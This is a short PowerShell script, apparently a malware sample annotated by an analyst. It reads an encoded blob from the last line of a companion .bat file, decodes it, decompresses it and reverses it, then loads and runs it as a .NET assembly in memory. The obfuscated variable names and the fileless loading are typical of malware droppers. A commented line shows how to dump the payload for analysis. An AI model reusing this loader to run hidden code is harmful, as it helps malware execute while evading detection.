# PowerShell script that inyects a DLL into memory
# .bat -> .ps1 -> DLL
$Effgzjcl = [IO.File]::ReadLines((([System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName).ToString() + ".bat"), [text.encoding]::UTF8) | Select-Object -last 1;
$Zmhnvfv = [System.Convert]::FromBase64String($Effgzjcl);
$Jnomuwxgu = New-Object System.IO.MemoryStream( , $Zmhnvfv );
$output = New-Object System.IO.MemoryStream;
$Tcnzfde = New-Object System.IO.Compression.GzipStream $Jnomuwxgu, ([IO.Compression.CompressionMode]::Decompress);
$Tcnzfde.CopyTo( $output );
$Tcnzfde.Close();
$Jnomuwxgu.Close();
[byte[]] $Zmhnvfv = $output.ToArray();
[Array]::Reverse($Zmhnvfv);
# Ready to dump:
# Set-Content output.bin -Value $Zmhnvfv -Encoding Byte
$Jexfoq = [System.Reflection.Assembly]::Load($Zmhnvfv);
$Jzwxbia = $Jexfoq.GetExportedTypes()[0];
$Aycwhqh = $Jzwxbia.GetMethods()[0].Invoke($null, $null) | Out-Null